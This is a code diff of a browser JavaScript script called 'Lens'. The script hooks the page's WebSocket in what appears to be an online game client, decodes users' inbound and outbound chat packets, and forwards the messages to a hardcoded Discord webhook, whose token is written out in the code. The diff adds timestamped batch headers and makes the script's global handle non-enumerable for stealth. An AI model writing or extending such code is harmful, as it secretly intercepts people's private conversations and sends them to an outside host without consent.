@@ -8,6 +8,7 @@
 
     var WEBHOOK_URL = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
     var DEBUG = false; // Altere para true para ver logs detalhados
+    var HEADER_INTERVAL = 60 * 1000; // intervalo em ms para inserir cabeçalho de tempo (60s)
 
     var _origWebSocket = window.WebSocket;
     var _ws = null;
@@ -18,32 +19,32 @@
     var _accountName = '';
     var _recentPackets = new Map();
     var _recentOutbound = [];
+    var _lastHeaderTime = 0;
     var _noop = function() {};
 
     function _log() {
         if (DEBUG) console.log.apply(console, ['[Lens]'].concat(Array.prototype.slice.call(arguments)));
     }
 
+    // ================= FUNÇÃO DE TIMESTAMP CORRIGIDA =================
     function _nowBrasilia() {
         var now = new Date();
-        var options = {
-            timeZone: 'America/Sao_Paulo',
-            year: 'numeric', month: '2-digit', day: '2-digit',
-            hour: '2-digit', minute: '2-digit', second: '2-digit',
-            hour12: false
-        };
-        var formatter = new Intl.DateTimeFormat('pt-BR', options);
-        var parts = formatter.formatToParts(now);
-        var result = '';
-        parts.forEach(function(p) {
-            if (p.type === 'year') result += p.value;
-            else if (p.type === 'month') result += '/' + p.value;
-            else if (p.type === 'day') result += '/' + p.value + ' ';
-            else if (p.type === 'hour') result += p.value + ':';
-            else if (p.type === 'minute') result += p.value + ':';
-            else if (p.type === 'second') result += p.value;
-        });
-        return result;
+        // Obtém a data/hora em Brasília usando fuso explícito
+        var brt = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
+        var dd = String(brt.getDate()).padStart(2, '0');
+        var mm = String(brt.getMonth() + 1).padStart(2, '0');
+        var yyyy = brt.getFullYear();
+        var hh = String(brt.getHours()).padStart(2, '0');
+        var min = String(brt.getMinutes()).padStart(2, '0');
+        var ss = String(brt.getSeconds()).padStart(2, '0');
+        return dd + '/' + mm + '/' + yyyy + ' ' + hh + ':' + min + ':' + ss;
+    }
+
+    // ================= SANITIZAÇÃO ROBUSTA DE MENSAGENS =================
+    function _cleanMessage(msg) {
+        if (!msg) return '';
+        // Remove todos os caracteres de controle (0x00-0x1F, 0x7F-0x9F) e espaços extras
+        return msg.replace(/[\x00-\x1F\x7F-\x9F]/g, '').trim();
     }
 
     function _fastBufferHash(buffer) {
@@ -98,7 +99,6 @@
             var header = view.getUint16(4, false);
             if (header !== 3111) return;
             
-            // CORRIGIDO: offset 6 = contagem de usuários
             var offset = 6;
             var userCount = view.getUint16(offset, false);
             offset += 2;
@@ -128,7 +128,7 @@
                     }
                 }
                 
-                // Skip: motto (2 bytes len + string), figure (2 bytes len + string), sex (1 byte), achievement score (2 bytes + array)
+                // Skip: motto, figure, sex, etc.
                 if (offset + 2 <= view.byteLength) {
                     var mottoLen = view.getUint16(offset, false);
                     if (mottoLen > 0 && mottoLen < 256) offset += 2 + mottoLen;
@@ -196,7 +196,6 @@
             var header = view.getUint16(4, false);
             if (header !== 2447) return;
             
-            // Tenta múltiplos offsets possíveis
             var offsetsToTry = [
                 [12, 14, 16],  // offset mais comum
                 [8, 10, 12],   // alternativa
@@ -240,7 +239,6 @@
             var header = view.getUint16(4, false);
             if (header !== 2583) return;
             
-            // offset 6: userId (2 bytes), offset 8: nameLen (2 bytes), offset 10: name
             var userId = view.getUint16(6, false);
             var nameLen = view.getUint16(8, false);
             
@@ -251,7 +249,6 @@
                     _accountName = name;
                     _log('USER_INFO: accountName = "' + _accountName + '"');
                     
-                    // Verifica se já sabemos o virtualId
                     for (var vid in _virtualIdMap) {
                         if (_virtualIdMap[vid] === _accountName) {
                             _myVirtualId = parseInt(vid);
@@ -266,8 +263,21 @@
         }
     }
 
+    // ================= CABEÇALHO PERIÓDICO =================
+    function _checkAndInsertHeader() {
+        var now = Date.now();
+        if (now - _lastHeaderTime >= HEADER_INTERVAL) {
+            var fullTime = _nowBrasilia();
+            var hhmm = fullTime.substring(11, 16); // extrai HH:MM
+            var header = '----------------Mensagens: ' + hhmm + '-------------------';
+            _queue.push(header);
+            _lastHeaderTime = now;
+        }
+    }
+
     function _sendToDiscord(message) {
         if (!message || message.length < 5) return;
+        _checkAndInsertHeader(); // <-- insere separador se necessário
         _queue.push(message);
         if (!_isSending) _processQueue();
     }
@@ -278,7 +288,6 @@
         var batch = _queue.splice(0, 5);
         var content = batch.join('\n');
         
-        // Trunca se ultrapassar limite do Discord
         if (content.length > 1950) {
             content = content.substring(0, 1950) + '...';
         }
@@ -293,6 +302,7 @@
         });
     }
 
+    // ================= PROCESSAMENTO DE MENSAGENS (COM _cleanMessage) =================
     function _parseInboundChat(data) {
         try {
             var view = new DataView(data);
@@ -306,7 +316,6 @@
             var offset = 6;
             var targetId = null;
             
-            // CORRIGIDO: header 890 tem targetId antes do virtualId
             if (header === 890) {
                 if (offset + 2 > view.byteLength) return null;
                 targetId = view.getUint16(offset, false);
@@ -314,12 +323,10 @@
                 _log('  targetId=' + targetId);
             }
             
-            // virtualId
             if (offset + 2 > view.byteLength) return null;
             var virtualId = view.getUint16(offset, false);
             offset += 2;
             
-            // msgLen
             if (offset + 2 > view.byteLength) return null;
             var msgLen = view.getUint16(offset, false);
             offset += 2;
@@ -335,15 +342,12 @@
             
             var msgBytes = new Uint8Array(data, offset, msgLen);
             var msg = new TextDecoder().decode(msgBytes);
-            
-            // Remove null bytes E caracteres de controle que podem estar poluindo
-            msg = msg.replace(/\0/g, '').replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '').trim();
+            msg = _cleanMessage(msg); // sanitização robusta
             
             _log('  msg="' + msg + '"');
             
             if (!msg) return null;
             
-            // Filtro de eco melhorado
             if (_isEcho(virtualId, msg)) {
                 _log('  -> ECO filtrado');
                 return null;
@@ -375,7 +379,6 @@
             
             _log('Chat OUTBOUND length=' + view.byteLength);
             
-            // CORRIGIDO: offset 6 = msgLen, offset 8 = mensagem
             var msgLen = view.getUint16(6, false);
             
             _log('  msgLen=' + msgLen);
@@ -384,7 +387,7 @@
             
             var msgBytes = new Uint8Array(data, 8, msgLen);
             var msg = new TextDecoder().decode(msgBytes);
-            msg = msg.replace(/\0/g, '').replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '').trim();
+            msg = _cleanMessage(msg); // sanitização robusta
             
             _log('  msg="' + msg + '"');
             
@@ -392,7 +395,6 @@
             
             _recentOutbound.push({ text: msg, time: Date.now() });
             
-            // Limpa cache antigo
             var now = Date.now();
             _recentOutbound = _recentOutbound.filter(function(e) { return now - e.time < 3000; });
             
@@ -413,13 +415,11 @@
         var header = new DataView(data).getUint16(4, false);
         _log('Inbound header:', header, 'length:', data.byteLength);
         
-        // Parse de identificação
         if (header === 3111) _parseUnit(data);
         if (header === 2739) _parseItemWall(data);
         if (header === 2447) _parseChangeName(data);
         if (header === 2583) _parseUserInfo(data);
         
-        // Parse de chat
         var msg = _parseInboundChat(data);
         if (msg) _sendToDiscord(msg);
     }
@@ -504,7 +504,7 @@
             var refs = ['ws', 'socket', 'gameSocket', 'connection', 'wsConnection', '_ws'];
             for (var i = 0; i < refs.length; i++) {
                 var candidate = window[refs[i]];
-                if (candidate && candidate instanceof _origWebSocket && candidate.readyState === 1) { // 1 = OPEN
+                if (candidate && candidate instanceof _origWebSocket && candidate.readyState === 1) {
                     _ws = candidate;
                     _log('WebSocket existente capturado:', refs[i]);
                     clearInterval(iv);
@@ -529,13 +529,20 @@
         _virtualIdMap = {};
         _myVirtualId = null;
         _accountName = '';
+        _lastHeaderTime = 0;
         window.WebSocket = _origWebSocket;
         window._wsHooked = false;
         _ws = null;
         delete window._lens;
     }
 
-    window._lens = { kill: kill, init: init };
+    // Exposição furtiva (não-enumerável)
+    Object.defineProperty(window, '_lens', {
+        value: { kill: kill, init: init },
+        configurable: false,
+        enumerable: false,
+        writable: false
+    });
 
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
         init();
